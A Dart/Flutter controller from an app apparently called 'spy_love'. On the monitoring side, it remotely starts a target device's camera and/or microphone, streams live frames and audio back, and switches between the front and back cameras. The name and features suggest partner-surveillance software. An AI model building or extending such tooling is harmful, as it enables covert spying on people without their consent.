import 'dart:async';
import 'package:flutter/foundation.dart';
import 'package:spy_love/core/network/media_stream_client.dart';
import 'package:spy_love/features/monitoring/live_av/live_media_repository.dart';
import 'package:spy_love/features/monitoring/live_av/live_media_session.dart';

enum LiveAvStatus { idle, requesting, waiting, live, ended, error }

/// Monitor-side controller for the Live AV tab.
class LiveAvController extends ChangeNotifier {
  LiveAvController(this._repo, this._stream);

  final LiveMediaRepository _repo;
  final MediaStreamClient _stream;

  LiveAvStatus _status = LiveAvStatus.idle;
  Uint8List? _frame;
  String? _error;
  LiveMediaSession? _session;
  String _facing = 'back';
  bool _micEnabled = false;
  bool _cameraEnabled = true;
  int _frameCount = 0;
  int _audioChunks = 0;

  // Latest PCM for optional playback (viewer plays via native later / skip).
  Uint8List? _lastPcm;
  int _pcmSampleRate = 16000;

  LiveAvStatus get status => _status;
  Uint8List? get frame => _frame;
  String? get error => _error;
  String get facing => _facing;
  bool get micEnabled => _micEnabled;
  bool get cameraEnabled => _cameraEnabled;
  int get frameCount => _frameCount;
  int get audioChunks => _audioChunks;
  Uint8List? get lastPcm => _lastPcm;
  int get pcmSampleRate => _pcmSampleRate;
  bool get isStreaming =>
      _status == LiveAvStatus.live || _status == LiveAvStatus.waiting;

  Future<void> start(
    String deviceId, {
    bool camera = true,
    bool mic = false,
    String facing = 'back',
  }) async {
    if (isStreaming) return;
    _cameraEnabled = camera;
    _micEnabled = mic;
    _facing = facing;
    _setStatus(LiveAvStatus.requesting);
    _error = null;

    final kind = camera && mic
        ? 'both'
        : mic
        ? 'microphone'
        : 'camera';

    final requested = await _repo.requestSession(
      deviceId,
      mediaKind: kind,
      cameraFacing: facing,
    );
    if (requested.isRight) {
      _error = requested.right;
      _setStatus(LiveAvStatus.error);
      return;
    }
    _session = requested.left;
    _setStatus(LiveAvStatus.waiting);

    final connected = await _stream.connect(
      _session!.wsPath,
      onFrame: (message) {
        final bytes = MediaStreamClient.decodeJpeg(message);
        if (bytes == null) return;
        _frame = Uint8List.fromList(bytes);
        _frameCount++;
        if (_status != LiveAvStatus.live) _status = LiveAvStatus.live;
        notifyListeners();
      },
      onAudio: (message) {
        final bytes = MediaStreamClient.decodePcm(message);
        if (bytes == null) return;
        _lastPcm = Uint8List.fromList(bytes);
        final data = message['data'];
        if (data is Map) {
          _pcmSampleRate = (data['sampleRate'] as num?)?.toInt() ?? 16000;
        }
        _audioChunks++;
        if (_status != LiveAvStatus.live) _status = LiveAvStatus.live;
        notifyListeners();
      },
      onSignal: (message) {
        final data = message['data'];
        final signal = data is Map ? data['signal'] : message['signal'];
        if (signal == 'ended' || signal == 'paused') {
          _setStatus(LiveAvStatus.ended);
        }
      },
      onClosed: () {
        if (_status != LiveAvStatus.ended && _status != LiveAvStatus.error) {
          _setStatus(LiveAvStatus.ended);
        }
      },
    );

    if (!connected) {
      _error = 'Could not open the live AV stream.';
      _setStatus(LiveAvStatus.error);
    }
  }

  Future<void> switchFacing() async {
    final session = _session;
    if (session == null || !isStreaming) return;
    final next = _facing == 'front' ? 'back' : 'front';
    final result = await _repo.setFacing(session.id, next);
    if (result.isLeft) {
      _facing = next;
      notifyListeners();
    }
  }

  Future<void> stop() async {
    final session = _session;
    await _stream.close();
    if (session != null) {
      await _repo.endSession(session.id, reason: 'monitor_stopped');
    }
    _session = null;
    _frame = null;
    _lastPcm = null;
    _setStatus(LiveAvStatus.ended);
  }

  void _setStatus(LiveAvStatus status) {
    _status = status;
    notifyListeners();
  }

  @override
  void dispose() {
    unawaited(_stream.close());
    super.dispose();
  }
}
